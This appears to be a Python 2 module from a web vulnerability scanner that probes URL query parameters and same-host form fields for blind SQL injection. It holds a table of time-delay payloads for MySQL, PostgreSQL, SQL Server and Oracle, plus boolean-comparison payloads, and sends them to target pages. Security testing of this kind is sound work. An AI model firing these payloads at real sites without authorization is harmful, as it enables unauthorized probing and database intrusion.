from utils import add_url_params, change_url_params, get_url_host, get_form_params, compare, POST, GET
from urlparse import urlparse, urljoin, parse_qsl
from client import NotAPage, RedirectedToExternal

import copy
import time



#(select(0)from(select(sleep({0})))v)/*'+(select(0)from(select(sleep({0})))v)+'\"+(select(0)from(select(sleep({0})))v)+\"*/
TIME_INJECTIONS = {
    "MySQL": ("(select(0)from(select(sleep({0})))v)/*'+(select(0)from(select(sleep({0})))v)+'\"+(select(0)from(select(sleep({0})))v)+\"*/", "if(now()=sysdate(),sleep({0}),0)/*'XOR(if(now()=sysdate(),sleep({0}),0))OR'\"XOR(if(now()=sysdate(),sleep({0}),0))OR\"*/",),
    "PostgreSQL": (";SELECT pg_sleep({0})--", ");SELECT pg_sleep({0})--", "';SELECT pg_sleep({0})--", "');SELECT pg_sleep({0})--", "));SELECT pg_sleep({0})--", "'));SELECT pg_sleep({0})--", "SELECT pg_sleep({0})--"),
    "Microsoft SQL Server": ("; WAIT FOR DELAY '00:00:{0}'",),
    "Oracle": ("BEGIN DBMS_LOCK.SLEEP({0}); END;",),
}

BOOLEAN_INJECTIONS = {
    " AND 3*2*1=6 AND 119=119": True,
    " AND 3*2*2=6 AND 119=119": False,
    " AND 3*2*1=6 AND 119=118": False,
    " AND 5*4=20 AND 119=119": True,
    " AND 5*4=21 AND 119=119": False,
    " AND 7*7>48 AND 119=119": True
}

BOOL_TEST_COUNT = len(BOOLEAN_INJECTIONS)

def sql_blind(page, client):
    print "Testing for SQL Blind in page {}".format(page.url)

    if urlparse(page.url).query:
        time_based_blind(client, page.url, method=GET)
        boolean_blind(client, page)

    for form in page.get_forms():
        action = urljoin(page.url, form.get('action'))

        if get_url_host(page.url) != get_url_host(action):
            continue

        method = form.get('method') or GET
        params = get_form_params(form)

        time_based_blind(client, action, method, params)


def boolean_blind(client, page):
    page_content = list(page.document.stripped_strings)
    parsed_url = urlparse(page.url)
    url_parts = list(parsed_url)
    query = dict(parse_qsl(url_parts[4]))

    for param, value in query.iteritems():
        successed = 0
        for payload, is_correct in BOOLEAN_INJECTIONS.iteritems():

            injected_action = add_url_params(parsed_url, {param: value + payload})

            try:
                res_page = client.get_req(injected_action)
                if is_correct == compare(page_content, list(res_page.document.stripped_strings)):
                    successed += 1
            except NotAPage:
                continue
            except RedirectedToExternal:
                continue

        if successed == BOOL_TEST_COUNT:
            print 'SQL blind (boolean) in param {}'.format(param)


def time_based_blind(client, action, method, params=None):
    report = {}
    if params:
        injectable, immutable = params
    else:
        injectable, immutable = {}, {}

    parsed_url = urlparse(action)

    if parsed_url.query:
        url_parts = list(urlparse(action))
        query = dict(parse_qsl(url_parts[4]))

        for param, value in query.iteritems():
            for db, injections in TIME_INJECTIONS.iteritems():
                for inj in injections:
                    successed = []
                    for t in xrange(0, 10, 3):
                        payload = inj.format(t)

                        injected_action = add_url_params(action, {param: payload})

                        inject = copy.deepcopy(injectable)
                        inject.update(immutable)

                        try:
                            # print method, injected_action, inject
                            req_time = request_injection(client, injected_action, method, inject).response.elapsed.total_seconds()
                            successed.append([t, req_time])
                        except NotAPage:
                            continue
                        except RedirectedToExternal:
                            continue

                    if successed and all(t <= rt for t, rt in successed):
                        print 'SQL blind db {} in form {} param {} injection {}'.format(db, action, urlparse(action).query, payload)


    for param in injectable.keys():
        for db, injections in TIME_INJECTIONS.iteritems():
            for inj in injections:
                successed = []
                for t in xrange(0, 10, 3):
                    payload = inj.format(t)

                    inject = inject_param(injectable, param, payload)
                    inject.update(immutable)

                    try:
                        req_time = request_injection(client, action, method, inject).response.elapsed.total_seconds()
                        successed.append([t, req_time])
                    except NotAPage:
                        continue
                    except RedirectedToExternal:
                        continue

                if successed and all(t <= rt for t, rt in successed):
                    print 'SQL blind db {} in form {} param {} injection {}'.format(db, action, param, payload)


def inject_param(parameters, param, injection):
    injected = copy.deepcopy(parameters)
    injected[param] = injection
    return injected

def request_injection(client, url, method, inject):
    # print method, url, inject
    if method.lower() == POST.lower():
        res_page = client.post_req(url, data=inject)
    else:
        injected_url = add_url_params(url, inject)
        res_page = client.get_req(injected_url)

    return res_page
